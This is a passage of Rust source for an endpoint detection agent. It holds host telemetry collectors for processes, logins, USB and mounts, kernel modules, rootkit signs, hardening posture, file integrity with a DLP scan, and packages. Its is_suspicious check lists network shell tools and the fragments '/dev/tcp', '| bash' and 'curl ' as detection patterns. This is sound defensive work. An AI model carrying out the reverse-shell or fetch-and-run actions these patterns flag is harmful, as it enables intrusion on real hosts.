//! Endpoint collectors. Each produces real telemetry from the host:
//!   - process: new process executions (pid/ppid/cmdline/parent lineage)
//!   - login:   interactive logins / logouts (via `who`)
//!   - usb:     removable device attach/detach
//!   - fim:     file integrity monitoring (create/modify/delete + content DLP scan)
//!   - package: package manager install/remove drift
//!   - network: established outbound connections
//! These are cross-platform polling/log-based collectors that run on any host. Kernel-grade
//! sources (auditd, udev, fanotify, eBPF) for higher-fidelity capture are the documented
//! production roadmap (see docs/) — they are NOT yet implemented here.

use std::collections::{HashMap, HashSet};
use std::io::{Read, Seek, SeekFrom};
use std::process::Command;

use regex::Regex;
use sha2::{Digest, Sha256};
use sysinfo::{Pid, ProcessRefreshKind, ProcessesToUpdate, System, UpdateKind, Users};
use walkdir::WalkDir;

use crate::dlp;
use crate::event::{AuthInfo, DlpInfo, Event, FileInfo, NetInfo, Process, UsbInfo};

/// Categorize a destination domain for internet/browser monitoring.
pub fn categorize_domain(domain: &str) -> &'static str {
    let d = domain.to_lowercase();
    const WEBMAIL: [&str; 5] = ["mail.google", "outlook", "gmail", "proton.me", "yahoo.com"];
    const CLOUD: [&str; 7] = [
        "drive.google",
        "dropbox",
        "box.com",
        "wetransfer",
        "mega.nz",
        "s3.amazonaws",
        "onedrive",
    ];
    const SOCIAL: [&str; 5] = ["facebook", "twitter", "instagram", "tiktok", "reddit"];
    const DEV: [&str; 3] = ["github", "gitlab", "bitbucket"];
    if WEBMAIL.iter().any(|x| d.contains(x)) {
        return "webmail";
    }
    if CLOUD.iter().any(|x| d.contains(x)) {
        return "cloud_storage";
    }
    if SOCIAL.iter().any(|x| d.contains(x)) {
        return "social";
    }
    if DEV.iter().any(|x| d.contains(x)) {
        return "dev";
    }
    "web"
}

// ---------------- process ----------------

pub struct ProcessCollector {
    sys: System,
    users: Users,
    seen: HashSet<u32>,
    first: bool,
    ticks: u64,
}

impl ProcessCollector {
    pub fn new() -> Self {
        ProcessCollector {
            sys: System::new(),
            users: Users::new_with_refreshed_list(),
            seen: HashSet::new(),
            first: true,
            ticks: 0,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        // Refresh WITH user info — sysinfo's default refresh kind omits user_id, which left
        // process.uid/user empty. Request it explicitly so user-scoped detections work.
        self.sys.refresh_processes_specifics(
            ProcessesToUpdate::All,
            true,
            ProcessRefreshKind::nothing()
                .with_cmd(UpdateKind::Always)
                .with_exe(UpdateKind::Always)
                .with_user(UpdateKind::Always),
        );
        // Refresh the uid->name table occasionally so new accounts resolve (cheap; not every poll).
        self.ticks = self.ticks.wrapping_add(1);
        if self.ticks % 30 == 0 {
            self.users.refresh();
        }
        let mut out = Vec::new();
        let mut current = HashSet::new();
        // snapshot pid->name for parent lineage
        let names: HashMap<Pid, String> = self
            .sys
            .processes()
            .iter()
            .map(|(pid, p)| (*pid, p.name().to_string_lossy().to_string()))
            .collect();

        for (pid, proc_) in self.sys.processes() {
            let pidu = pid.as_u32();
            current.insert(pidu);
            if self.seen.contains(&pidu) {
                continue;
            }
            if self.first {
                continue; // don't flood with the initial process table
            }
            let parent = proc_
                .parent()
                .and_then(|pp| names.get(&pp))
                .cloned()
                .unwrap_or_default();
            let cmdline = proc_
                .cmd()
                .iter()
                .map(|s| s.to_string_lossy())
                .collect::<Vec<_>>()
                .join(" ");
            let exe = proc_
                .exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_default();
            let name = proc_.name().to_string_lossy().to_string();
            // Skip daemon worker-fork relabels (postgres/nginx rewrite each forked worker's
            // argv to a status line like "postgres: <user> <db> <client> idle"). These are
            // fork()s, not execve()s, and otherwise emit one noisy "exec" per DB connection
            // whose proctitle looks like — but is not — a network destination.
            if is_worker_relabel(&name, &cmdline) {
                continue;
            }
            // Real acting identity (was hardcoded uid 0 / empty user → killed user-scoped rules).
            let uid_obj = proc_.user_id();
            let uid: i64 = uid_obj
                .and_then(|u| u.to_string().parse::<i64>().ok())
                .unwrap_or(0);
            let user = uid_obj
                .and_then(|u| self.users.get_user_by_id(u))
                .map(|u| u.name().to_string())
                .unwrap_or_default();
            // Full ancestry chain (pid1→…→self), not just the immediate parent.
            let mut chain = vec![name.clone()];
            let mut cur = proc_.parent();
            let mut depth = 0;
            while let Some(pp) = cur {
                if depth > 16 {
                    break;
                }
                if let Some(pn) = names.get(&pp) {
                    chain.push(pn.clone());
                }
                cur = self.sys.process(pp).and_then(|p| p.parent());
                depth += 1;
            }
            chain.reverse();
            let lineage = chain.join("→");
            let container = container_of(pidu);
            let sev = if is_suspicious(&name, &cmdline) {
                "medium"
            } else {
                "info"
            };
            let mut ev = Event::new("process", "exec", sev)
                .with_user(&user)
                .msg(format!("{} executed: {}", name, truncate(&cmdline, 240)));
            ev.process = Some(Process {
                pid: pidu as i64,
                ppid: proc_.parent().map(|p| p.as_u32() as i64).unwrap_or(0),
                name,
                exe,
                cmdline,
                uid,
                user,
                parent,
                lineage,
                container,
            });
            out.push(ev);
        }
        self.seen = current;
        self.first = false;
        out
    }
}

/// True when a process's argv is a daemon's worker status-line rather than a real command.
/// Postgres backends ("postgres: …"), nginx workers ("nginx: worker process"), etc. rewrite
/// their proctitle on fork; treating those as exec events floods the stream with benign noise.
fn is_worker_relabel(name: &str, cmdline: &str) -> bool {
    if cmdline.starts_with("postgres:") {
        return true; // postgres rewrites argv[0] without a space sometimes
    }
    if name.is_empty() {
        return false;
    }
    cmdline.starts_with(&format!("{name}: "))
}

fn is_suspicious(name: &str, cmd: &str) -> bool {
    const TOOLS: [&str; 8] = [
        "nc", "ncat", "socat", "nmap", "tcpdump", "scp", "rsync", "base64",
    ];
    TOOLS.contains(&name)
        || cmd.contains("/dev/tcp")
        || cmd.contains("| bash")
        || cmd.contains("curl ")
}

/// Container context for a pid from its cgroup membership ("" if not containerized).
fn container_of(pid: u32) -> String {
    #[cfg(target_os = "linux")]
    {
        return std::fs::read_to_string(format!("/proc/{pid}/cgroup"))
            .map(|t| parse_container_from_cgroup(&t))
            .unwrap_or_default();
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = pid;
        String::new()
    }
}

/// Derive "runtime:shortid" from a /proc/<pid>/cgroup body. Recognizes docker, containerd/CRI,
/// podman and generic kubepods paths. Returns "" when the task isn't in a container.
fn parse_container_from_cgroup(text: &str) -> String {
    for line in text.lines() {
        let path = line.rsplit(':').next().unwrap_or(line);
        let id = match longest_hex_run(path) {
            Some(id) => id,
            None => continue,
        };
        let runtime = if path.contains("docker") {
            "docker"
        } else if path.contains("crio") {
            "crio"
        } else if path.contains("containerd") || path.contains("cri-containerd") {
            "containerd"
        } else if path.contains("libpod") || path.contains("podman") {
            "podman"
        } else if path.contains("kubepods") {
            "k8s"
        } else {
            "container"
        };
        return format!("{}:{}", runtime, &id[..id.len().min(12)]);
    }
    String::new()
}

/// Longest contiguous hex run >= 32 chars (a container id; avoids matching dictionary words).
fn longest_hex_run(s: &str) -> Option<String> {
    let mut longest = String::new();
    let mut run = String::new();
    for c in s.chars() {
        if c.is_ascii_hexdigit() {
            run.push(c);
        } else {
            if run.len() > longest.len() {
                longest = std::mem::take(&mut run);
            } else {
                run.clear();
            }
        }
    }
    if run.len() > longest.len() {
        longest = run;
    }
    if longest.len() >= 32 {
        Some(longest)
    } else {
        None
    }
}

// ---------------- login ----------------

pub struct LoginCollector {
    seen: HashSet<String>,
    first: bool,
}

impl LoginCollector {
    pub fn new() -> Self {
        LoginCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let mut out = Vec::new();
        let output = match Command::new("who").output() {
            Ok(o) => o,
            Err(_) => return out,
        };
        let text = String::from_utf8_lossy(&output.stdout);
        let mut current = HashSet::new();
        for line in text.lines() {
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.is_empty() {
                continue;
            }
            let user = fields[0].to_string();
            let tty = fields.get(1).cloned().unwrap_or("").to_string();
            let src = line
                .find('(')
                .and_then(|i| {
                    line[i + 1..]
                        .find(')')
                        .map(|j| line[i + 1..i + 1 + j].to_string())
                })
                .unwrap_or_default();
            let key = format!("{user}|{tty}|{src}");
            current.insert(key.clone());
            if !self.seen.contains(&key) && !self.first {
                let mut ev = Event::new("auth", "login", "info")
                    .with_user(&user)
                    .msg(format!(
                        "login: {user} on {tty} from {}",
                        if src.is_empty() { "local" } else { &src }
                    ));
                ev.auth = Some(AuthInfo {
                    method: if src.is_empty() {
                        "local".into()
                    } else {
                        "network".into()
                    },
                    source_ip: src,
                    tty,
                    result: "success".into(),
                });
                out.push(ev);
            }
        }
        // logouts
        for old in self.seen.difference(&current) {
            let parts: Vec<&str> = old.split('|').collect();
            let user = parts.first().cloned().unwrap_or("");
            out.push(
                Event::new("auth", "logout", "info")
                    .with_user(user)
                    .msg(format!("logout: {user}")),
            );
        }
        self.seen = current;
        self.first = false;
        out
    }
}

// ---------------- usb ----------------

pub struct UsbCollector {
    seen: HashSet<String>,
    first: bool,
}

impl UsbCollector {
    pub fn new() -> Self {
        UsbCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let devices = list_usb();
        let mut out = Vec::new();
        let current: HashSet<String> = devices.iter().map(|d| d.serial.clone()).collect();
        for d in &devices {
            if !self.seen.contains(&d.serial) && !self.first {
                let mut ev = Event::new("usb", "insert", "medium")
                    .msg(format!("USB device connected: {} {}", d.vendor, d.product));
                ev.usb = Some(UsbInfo {
                    action: "insert".into(),
                    vendor: d.vendor.clone(),
                    product: d.product.clone(),
                    serial: d.serial.clone(),
                    mount: String::new(),
                    size_gb: 0,
                });
                out.push(ev);
            }
        }
        for old in self.seen.difference(&current) {
            let mut ev = Event::new("usb", "remove", "info").msg("USB device removed");
            ev.usb = Some(UsbInfo {
                action: "remove".into(),
                serial: old.clone(),
                ..Default::default()
            });
            out.push(ev);
        }
        self.seen = current;
        self.first = false;
        out
    }
}

#[derive(Default)]
struct Usb {
    vendor: String,
    product: String,
    serial: String,
}

fn list_usb() -> Vec<Usb> {
    #[cfg(target_os = "macos")]
    {
        let out = match Command::new("system_profiler")
            .arg("SPUSBDataType")
            .output()
        {
            Ok(o) => o,
            Err(_) => return Vec::new(),
        };
        let text = String::from_utf8_lossy(&out.stdout);
        let mut devices = Vec::new();
        let mut cur = Usb::default();
        let mut have = false;
        for line in text.lines() {
            let t = line.trim();
            if t.ends_with(':')
                && !t.contains("Serial Number")
                && line.starts_with("    ")
                && !line.starts_with("      ")
            {
                if have && !cur.product.is_empty() {
                    devices.push(std::mem::take(&mut cur));
                }
                cur = Usb {
                    product: t.trim_end_matches(':').to_string(),
                    ..Default::default()
                };
                have = true;
            } else if let Some(v) = t.strip_prefix("Serial Number:") {
                cur.serial = v.trim().to_string();
            } else if let Some(v) = t.strip_prefix("Manufacturer:") {
                cur.vendor = v.trim().to_string();
            }
        }
        if have && !cur.product.is_empty() {
            if cur.serial.is_empty() {
                cur.serial = cur.product.clone();
            }
            devices.push(cur);
        }
        for d in devices.iter_mut() {
            if d.serial.is_empty() {
                d.serial = d.product.clone();
            }
        }
        return devices;
    }
    #[cfg(target_os = "linux")]
    {
        let mut devices = Vec::new();
        let base = std::path::Path::new("/sys/bus/usb/devices");
        if let Ok(entries) = std::fs::read_dir(base) {
            for e in entries.flatten() {
                let p = e.path();
                let product = read_trim(&p.join("product"));
                let serial = read_trim(&p.join("serial"));
                let vendor = read_trim(&p.join("manufacturer"));
                if product.is_empty() && serial.is_empty() {
                    continue;
                }
                let id = if serial.is_empty() {
                    format!("{}-{}", vendor, product)
                } else {
                    serial.clone()
                };
                devices.push(Usb {
                    vendor,
                    product,
                    serial: id,
                });
            }
        }
        return devices;
    }
    #[allow(unreachable_code)]
    Vec::new()
}

#[cfg(target_os = "linux")]
fn read_trim(p: &std::path::Path) -> String {
    std::fs::read_to_string(p)
        .map(|s| s.trim().to_string())
        .unwrap_or_default()
}

// ---------------- removable-media mounts ----------------

/// Watches for filesystems mounted under removable-media paths (USB sticks, SD cards, phones,
/// FUSE shares mounted there). Complements UsbCollector (which sees the device) by capturing
/// the actual mount, which is where data exfiltration to removable media happens.
pub struct MountCollector {
    seen: HashSet<String>,
    first: bool,
}

impl MountCollector {
    pub fn new() -> Self {
        MountCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let mounts = removable_mounts();
        let current: HashSet<String> = mounts.iter().map(|m| m.key()).collect();
        let mut out = Vec::new();
        for m in &mounts {
            if !self.seen.contains(&m.key()) && !self.first {
                let mut ev = Event::new("usb", "mount", "medium").msg(format!(
                    "removable media mounted: {} at {} ({})",
                    m.device, m.mountpoint, m.fstype
                ));
                ev.usb = Some(UsbInfo {
                    action: "mount".into(),
                    product: m.device.clone(),
                    mount: m.mountpoint.clone(),
                    ..Default::default()
                });
                out.push(ev);
            }
        }
        for old in self.seen.difference(&current) {
            let mp = old.split('\t').nth(1).unwrap_or("").to_string();
            let mut ev = Event::new("usb", "unmount", "info")
                .msg(format!("removable media unmounted: {mp}"));
            ev.usb = Some(UsbInfo {
                action: "unmount".into(),
                mount: mp,
                ..Default::default()
            });
            out.push(ev);
        }
        self.seen = current;
        self.first = false;
        out
    }
}

struct Mount {
    device: String,
    mountpoint: String,
    fstype: String,
}

impl Mount {
    fn key(&self) -> String {
        format!("{}\t{}", self.device, self.mountpoint)
    }
}

/// Mount points considered "removable media" for monitoring purposes.
const REMOVABLE_PREFIXES: [&str; 4] = ["/media", "/mnt", "/run/media", "/Volumes"];

fn is_removable_mount(mountpoint: &str) -> bool {
    REMOVABLE_PREFIXES
        .iter()
        .any(|p| mountpoint == *p || mountpoint.starts_with(&format!("{p}/")))
}

/// Parse /proc/mounts text into removable-media mounts. Pure (testable). Octal-escaped spaces
/// (\040) in paths are decoded; pseudo filesystems are skipped.
fn parse_proc_mounts(text: &str) -> Vec<Mount> {
    const PSEUDO: [&str; 8] = [
        "proc", "sysfs", "tmpfs", "devtmpfs", "cgroup", "cgroup2", "devpts", "mqueue",
    ];
    let unescape = |s: &str| s.replace("\\040", " ").replace("\\011", "\t");
    let mut out = Vec::new();
    for line in text.lines() {
        let f: Vec<&str> = line.split_whitespace().collect();
        if f.len() < 3 {
            continue;
        }
        let mountpoint = unescape(f[1]);
        let fstype = f[2].to_string();
        if PSEUDO.contains(&fstype.as_str()) || !is_removable_mount(&mountpoint) {
            continue;
        }
        out.push(Mount {
            device: unescape(f[0]),
            mountpoint,
            fstype,
        });
    }
    out
}

fn removable_mounts() -> Vec<Mount> {
    #[cfg(target_os = "linux")]
    {
        return std::fs::read_to_string("/proc/mounts")
            .map(|t| parse_proc_mounts(&t))
            .unwrap_or_default();
    }
    #[cfg(target_os = "macos")]
    {
        let out = match Command::new("mount").output() {
            Ok(o) => o,
            Err(_) => return Vec::new(),
        };
        let text = String::from_utf8_lossy(&out.stdout);
        let mut mounts = Vec::new();
        for line in text.lines() {
            // "device on /Volumes/Name (fstype, ...)"
            if let Some((dev, rest)) = line.split_once(" on ") {
                if let Some((mp, tail)) = rest.split_once(" (") {
                    if is_removable_mount(mp) {
                        let fstype = tail.split([',', ')']).next().unwrap_or("").to_string();
                        mounts.push(Mount {
                            device: dev.to_string(),
                            mountpoint: mp.to_string(),
                            fstype,
                        });
                    }
                }
            }
        }
        return mounts;
    }
    #[allow(unreachable_code)]
    Vec::new()
}

// ---------------- kernel modules ----------------

/// Watches for newly loaded kernel modules — a core rootkit / unexpected-driver signal. Reads
/// /proc/modules and diffs; the initial snapshot is suppressed so only post-start loads fire.
pub struct ModuleCollector {
    seen: HashSet<String>,
    first: bool,
}

impl ModuleCollector {
    pub fn new() -> Self {
        ModuleCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let current: HashSet<String> = loaded_modules().into_iter().collect();
        let mut out = Vec::new();
        if !self.first {
            for m in current.difference(&self.seen) {
                let mut ev = Event::new("system", "kmod_load", "medium")
                    .msg(format!("kernel module loaded: {m}"));
                ev.extra
                    .insert("module".into(), serde_json::Value::String(m.clone()));
                out.push(ev);
            }
        }
        self.seen = current;
        self.first = false;
        out
    }
}

/// First token of each /proc/modules line = the module name. Pure (testable).
fn parse_proc_modules(text: &str) -> Vec<String> {
    text.lines()
        .filter_map(|l| l.split_whitespace().next().map(|s| s.to_string()))
        .collect()
}

fn loaded_modules() -> Vec<String> {
    #[cfg(target_os = "linux")]
    {
        return std::fs::read_to_string("/proc/modules")
            .map(|t| parse_proc_modules(&t))
            .unwrap_or_default();
    }
    #[cfg(not(target_os = "linux"))]
    {
        Vec::new()
    }
}

// ---------------- rootkit indicators ----------------

/// Looks for rootkit tells: PIDs reachable via kill(2) but hidden from /proc (the classic
/// getdents hook), /etc/ld.so.preload tampering (LD_PRELOAD rootkits), and kernel taint.
/// Throttled — the PID sweep is bounded and only runs every ~60 ticks.
pub struct RootkitCollector {
    seen_hidden: HashSet<i32>,
    preload_sig: Option<String>,
    first: bool,
    ticks: u64,
}

impl RootkitCollector {
    pub fn new() -> Self {
        RootkitCollector {
            seen_hidden: HashSet::new(),
            preload_sig: None,
            first: true,
            ticks: 0,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        self.ticks = self.ticks.wrapping_add(1);
        if self.ticks % 60 != 1 {
            return Vec::new();
        }
        let mut out = Vec::new();
        // hidden processes
        for pid in hidden_pids() {
            if self.seen_hidden.insert(pid) {
                out.push(
                    Event::new("system", "rootkit_hidden_pid", "critical")
                        .msg(format!("hidden process pid {pid}: reachable via kill(2) but absent from /proc (getdents hook)")),
                );
            }
        }
        // ld.so.preload tamper
        if let Some(sig) = preload_signature() {
            if self.preload_sig.as_deref() != Some(sig.as_str()) {
                let known = self.preload_sig.is_some();
                self.preload_sig = Some(sig.clone());
                if !self.first || known {
                    out.push(
                        Event::new("system", "preload_tamper", "critical")
                            .msg(format!("/etc/ld.so.preload present/changed: {sig}")),
                    );
                }
            }
        } else {
            self.preload_sig = None;
        }
        // kernel taint (module load / out-of-tree)
        if let Some(t) = kernel_tainted() {
            if t != 0 && self.first {
                out.push(
                    Event::new("system", "kernel_tainted", "medium").msg(format!(
                        "kernel taint flags = {t} (out-of-tree/forced module loaded)"
                    )),
                );
            }
        }
        self.first = false;
        out
    }
}

#[cfg(target_os = "linux")]
fn proc_pids() -> HashSet<i32> {
    std::fs::read_dir("/proc")
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| e.file_name().to_string_lossy().parse::<i32>().ok())
        .collect()
}

#[cfg(target_os = "linux")]
fn pid_alive(pid: i32) -> bool {
    // kill(pid,0): Ok or EPERM => exists; ESRCH => doesn't.
    let r = unsafe { libc::kill(pid, 0) };
    r == 0 || std::io::Error::last_os_error().raw_os_error() == Some(libc::EPERM)
}

#[cfg(target_os = "linux")]
fn hidden_pids() -> Vec<i32> {
    let visible = proc_pids();
    // bound the sweep so it stays cheap (kill(2) is fast but pid_max can be millions)
    let max = std::fs::read_to_string("/proc/sys/kernel/pid_max")
        .ok()
        .and_then(|s| s.trim().parse::<i32>().ok())
        .unwrap_or(65536)
        .min(131072);
    // Pass 1: candidates that are kill-reachable but absent from the initial /proc snapshot.
    let mut candidates = Vec::new();
    for pid in 2..=max {
        if pid_alive(pid) && !visible.contains(&pid) {
            candidates.push(pid);
        }
    }
    if candidates.is_empty() {
        return candidates;
    }
    // Confirmation pass: a genuine getdents-hook hidden PID stays alive AND absent across a
    // FRESH /proc read + a re-stat of /proc/<pid> + a re-check of kill(2). A PID that merely
    // spawned during pass 1 (TOCTOU race) will now appear in /proc — drop it. Eliminates the
    // fork/exit race that otherwise fires false "rootkit" criticals on every busy host.
    std::thread::sleep(std::time::Duration::from_millis(150));
    let visible2 = proc_pids();
    candidates
        .into_iter()
        .filter(|&pid| {
            pid_alive(pid)
                && !visible2.contains(&pid)
                && !std::path::Path::new(&format!("/proc/{pid}")).exists()
                && !std::path::Path::new(&format!("/proc/{pid}/stat")).exists()
        })
        .collect()
}
#[cfg(not(target_os = "linux"))]
fn hidden_pids() -> Vec<i32> {
    Vec::new()
}

fn preload_signature() -> Option<String> {
    let body = std::fs::read_to_string("/etc/ld.so.preload").ok()?;
    let t = body.trim();
    if t.is_empty() {
        return None;
    }
    Some(truncate(t, 200))
}

#[cfg(target_os = "linux")]
fn kernel_tainted() -> Option<u64> {
    std::fs::read_to_string("/proc/sys/kernel/tainted")
        .ok()
        .and_then(|s| s.trim().parse::<u64>().ok())
}
#[cfg(not(target_os = "linux"))]
fn kernel_tainted() -> Option<u64> {
    None
}

// ---------------- hardening posture ----------------

/// Periodically grades host hardening: key sysctls, kernel lockdown, IMA, Secure-Boot tells.
/// Emits a single rolled-up posture event (info/medium/high by worst finding).
pub struct PostureCollector {
    reported: bool,
    ticks: u64,
}

impl PostureCollector {
    pub fn new() -> Self {
        PostureCollector {
            reported: false,
            ticks: 0,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        self.ticks = self.ticks.wrapping_add(1);
        // once at startup, then every ~30 min (assuming a few-second interval, 600 ticks)
        if self.reported && self.ticks % 600 != 0 {
            return Vec::new();
        }
        self.reported = true;
        let (findings, sev) = grade_posture(&read_posture());
        if findings.is_empty() {
            return Vec::new();
        }
        let mut ev = Event::new("system", "hardening_posture", sev).msg(format!(
            "host hardening: {} weak setting(s) — {}",
            findings.len(),
            findings.join("; ")
        ));
        ev.extra.insert(
            "weak".into(),
            serde_json::Value::Array(
                findings
                    .into_iter()
                    .map(serde_json::Value::String)
                    .collect(),
            ),
        );
        vec![ev]
    }
}

/// Read the posture inputs (name -> value). Linux reads /proc/sys + /sys/kernel/security.
fn read_posture() -> HashMap<String, String> {
    let mut m = HashMap::new();
    #[cfg(target_os = "linux")]
    {
        let rd = |p: &str| {
            std::fs::read_to_string(p)
                .ok()
                .map(|s| s.trim().to_string())
        };
        for (k, p) in [
            ("kptr_restrict", "/proc/sys/kernel/kptr_restrict"),
            ("dmesg_restrict", "/proc/sys/kernel/dmesg_restrict"),
            (
                "kexec_load_disabled",
                "/proc/sys/kernel/kexec_load_disabled",
            ),
            (
                "unprivileged_bpf_disabled",
                "/proc/sys/kernel/unprivileged_bpf_disabled",
            ),
            ("ptrace_scope", "/proc/sys/kernel/yama/ptrace_scope"),
            ("rp_filter", "/proc/sys/net/ipv4/conf/all/rp_filter"),
        ] {
            if let Some(v) = rd(p) {
                m.insert(k.to_string(), v);
            }
        }
        if let Some(v) = rd("/sys/kernel/security/lockdown") {
            m.insert("lockdown".into(), v);
        }
        m.insert(
            "ima".into(),
            if std::path::Path::new("/sys/kernel/security/ima").exists() {
                "present".into()
            } else {
                "absent".into()
            },
        );
        m.insert(
            "secureboot".into(),
            if std::path::Path::new("/sys/firmware/efi").exists() {
                "efi".into()
            } else {
                "legacy".into()
            },
        );
    }
    m
}

/// Grade posture inputs into a list of weak-setting findings + an overall severity. Pure/testable.
fn grade_posture(m: &HashMap<String, String>) -> (Vec<String>, &'static str) {
    let mut weak = Vec::new();
    let want_ge1 = |k: &str, label: &str, out: &mut Vec<String>| {
        if let Some(v) = m.get(k) {
            if v == "0" {
                out.push(label.to_string());
            }
        }
    };
    want_ge1(
        "kptr_restrict",
        "kptr_restrict=0 (kernel pointers exposed)",
        &mut weak,
    );
    want_ge1(
        "dmesg_restrict",
        "dmesg_restrict=0 (dmesg world-readable)",
        &mut weak,
    );
    want_ge1("kexec_load_disabled", "kexec_load not disabled", &mut weak);
    want_ge1(
        "unprivileged_bpf_disabled",
        "unprivileged_bpf enabled",
        &mut weak,
    );
    if m.get("ptrace_scope").map(|v| v == "0").unwrap_or(false) {
        weak.push("yama ptrace_scope=0 (any process can ptrace)".into());
    }
    if m.get("lockdown")
        .map(|v| v.contains("[none]"))
        .unwrap_or(false)
    {
        weak.push("kernel lockdown=none".into());
    }
    if m.get("ima").map(|v| v == "absent").unwrap_or(false) {
        weak.push("IMA not enabled (no runtime integrity measurement)".into());
    }
    // severity: any of the critical-ish → high, else medium
    let sev = if weak
        .iter()
        .any(|w| w.contains("bpf") || w.contains("lockdown") || w.contains("kexec"))
    {
        "high"
    } else if weak.is_empty() {
        "info"
    } else {
        "medium"
    };
    (weak, sev)
}

// ---------------- file integrity monitoring ----------------

pub struct FimCollector {
    policy: crate::config::SharedPolicy,
    hashes: HashMap<String, String>,
    first: bool,
    max_files: usize,
    max_scan_bytes: usize,
}

impl FimCollector {
    pub fn new(policy: crate::config::SharedPolicy) -> Self {
        FimCollector {
            policy,
            hashes: HashMap::new(),
            first: true,
            max_files: 4000,
            max_scan_bytes: 1_000_000,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let mut out = Vec::new();
        let mut current: HashMap<String, String> = HashMap::new();
        let mut count = 0;
        // snapshot the live policy so a mid-poll console push doesn't tear the scan; watch
        // dirs and the DLP toggle are both hot-reloadable.
        let (dirs, dlp_on) = match self.policy.read() {
            Ok(p) => (p.watch.clone(), p.dlp_enabled),
            Err(_) => (Vec::new(), false),
        };
        for dir in &dirs {
            if !std::path::Path::new(dir).exists() {
                continue;
            }
            for entry in WalkDir::new(dir)
                .max_depth(4)
                .into_iter()
                .filter_map(|e| e.ok())
            {
                if count >= self.max_files {
                    break;
                }
                if !entry.file_type().is_file() {
                    continue;
                }
                let path = entry.path().to_string_lossy().to_string();
                let meta = match entry.metadata() {
                    Ok(m) => m,
                    Err(_) => continue,
                };
                let size = meta.len();
                // hash small/medium files; for big files use size+mtime signature
                let sig = if size <= self.max_scan_bytes as u64 {
                    hash_file(entry.path()).unwrap_or_default()
                } else {
                    format!("size:{size}")
                };
                count += 1;
                let prev = self.hashes.get(&path).cloned();
                current.insert(path.clone(), sig.clone());
                if self.first {
                    continue;
                }
                // Skip unchanged files; emit on create OR modify.
                if let Some(old) = &prev {
                    if *old == sig {
                        continue;
                    }
                }
                let op = if prev.is_none() { "create" } else { "write" };
                // DLP content inspection runs on BOTH create and modify — a freshly-dropped
                // file with secrets (exfil staging) must be caught, not only edits to existing
                // files.
                if dlp_on && size <= self.max_scan_bytes as u64 {
                    if let Ok(content) = std::fs::read_to_string(entry.path()) {
                        if let Some(dev) = dlp_event_for(&path, &content) {
                            out.push(dev);
                        }
                    }
                }
                let mut ev = self.file_event(&path, op, size as i64, &sig);
                ev.severity = bump_for_path(&path);
                out.push(ev);
            }
        }
        if !self.first {
            for old in self.hashes.keys() {
                if !current.contains_key(old) {
                    out.push(self.file_event(old, "delete", 0, ""));
                }
            }
        }
        self.hashes = current;
        self.first = false;
        out
    }

    fn file_event(&self, path: &str, op: &str, size: i64, hash: &str) -> Event {
        let mut ev = Event::new("file", &format!("file_{op}"), &bump_for_path(path))
            .msg(format!("{op} {path}"));
        ev.file = Some(FileInfo {
            path: path.to_string(),
            op: op.to_string(),
            size,
            mode: String::new(),
            hash: hash.to_string(),
            is_dir: false,
        });
        ev
    }
}

fn bump_for_path(path: &str) -> String {
    const SENSITIVE: [&str; 8] = [
        "/etc/cron",
        "/etc/systemd",
        "authorized_keys",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/var/www",
        "rc.local",
    ];
    if SENSITIVE.iter().any(|s| path.contains(s)) {
        "medium".into()
    } else {
        "info".into()
    }
}

fn dlp_event_for(path: &str, content: &str) -> Option<Event> {
    let findings = dlp::scan(content);
    let f = findings.into_iter().max_by_key(|f| f.matches)?;
    let mut ev = Event::new("dlp", "content_match", &f.severity)
        .msg(format!("{} found in {}", f.label, path));
    ev.file = Some(FileInfo {
        path: path.to_string(),
        op: "read".into(),
        ..Default::default()
    });
    ev.dlp = Some(DlpInfo {
        classifier: f.classifier,
        channel: "file".into(),
        matches: f.matches as i64,
        sample: f.sample,
        policy: String::new(),
        verdict: String::new(),
    });
    Some(ev)
}

fn hash_file(path: &std::path::Path) -> Option<String> {
    let data = std::fs::read(path).ok()?;
    let mut h = Sha256::new();
    h.update(&data);
    Some(hex_lower(&h.finalize()))
}

/// Lower-hex encode bytes (sha2 0.11's finalize() output no longer impls LowerHex directly).
fn hex_lower(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for x in b {
        s.push_str(&format!("{:02x}", x));
    }
    s
}

// ---------------- package ----------------

pub struct PackageCollector {
    seen: HashSet<String>,
    first: bool,
}

impl PackageCollector {
    pub fn new() -> Self {
        PackageCollector {
            seen: HashSet::new(),
            first: true,
        }
    }

    pub fn poll(&mut self) -> Vec<Event> {
        let pkgs = list_packages();
        if pkgs.is_empty() {
            return Vec::new();
        }
        let current: HashSet<String> = pkgs.into_iter().collect();
        let mut out = Vec::new();
        if !self.first {
            for p in current.difference(&self.seen) {
                out.push(
                    Event::new("package", "package_install", "low")
                        .msg(format!("package installed: {p}")),
                );
            }
            for p in self.seen.difference(&current) {
                out.push(
                    Event::new("package", "package_remove", "low")
                        .msg(format!("package removed: {p}")),
                );
            }
        }
        self.seen = current;
        self.first = false;
        out
    }
}

fn list_packages() -> Vec<String> {
    let candidates: &[(&str, &[&str])] = &[
        ("dpkg-query", &["-W", "-f=${Package}\n"]),
        ("rpm", &["-qa"]),
        ("brew", &["list", "--formula"]),
        ("pacman", &["-Qq"]),
    ];
    for (bin, args) in candidates {
        if let Ok(out) = Command::new(bin).args(*args).output() {
            if out.status.success() {
                return String::from_utf8_lossy(&out.stdout)
                    .lines()
                    .map(|l| l.trim().to_string())
                    .filter(|l| !l.is_empty())
                    .collect();
            }
        }
    }
    Vec::new()
}

// ---------------- ssh / auth log ----------------

/// Reads new lines from system auth logs to capture SSH success/failure and sudo use —
/// events the snapshot collectors cannot see. Tracks a byte offset per file so each line
/// is reported once. Linux/Unix only; absent files are skipped.
pub struct AuthLogCollector {
    offsets: HashMap<String, u64>,
